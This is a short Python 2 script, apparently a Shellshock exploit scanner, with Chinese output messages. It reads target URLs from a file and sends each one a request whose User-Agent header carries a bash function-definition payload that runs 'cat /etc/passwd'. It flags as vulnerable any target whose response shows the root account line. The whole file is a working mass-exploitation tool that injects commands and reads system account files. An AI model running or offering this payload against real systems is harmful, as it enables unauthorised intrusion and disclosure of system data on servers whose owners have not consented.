#coding=utf-8
import urllib2,re
import urllib

def bash_exp(url): 
	regex = re.compile(r'/root:/bin/bash')
	header = {
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Charset': 'gb18030,utf-8;q=0.7,*;q=0.3',
		'Accept-Encoding': 'gzip,deflate,sdch',
		'Accept-Language': 'en-US,en;q=0.8',
		'Connection': 'keep-alive',
		'User-Agent': '() { :;}; echo `/bin/cat /etc/passwd`',
		'Referer': 'http://www.google.com.hk'
		}
	request = urllib2.Request(url,headers = header)
	try:
		res = urllib2.urlopen(request)
		if re.findall(regex,res.read()):
			print u"bash: %s"%(url)
		else:
			print u"无bash漏洞: %s"%(url)
		res.close()
	except Exception:
		print u"访问网页超时%s"%(url)

if __name__=='__main__':
	f = open('target.txt','r')
	for i in f.readlines():
		bash_exp(urllib.unquote(i))
	f.close()
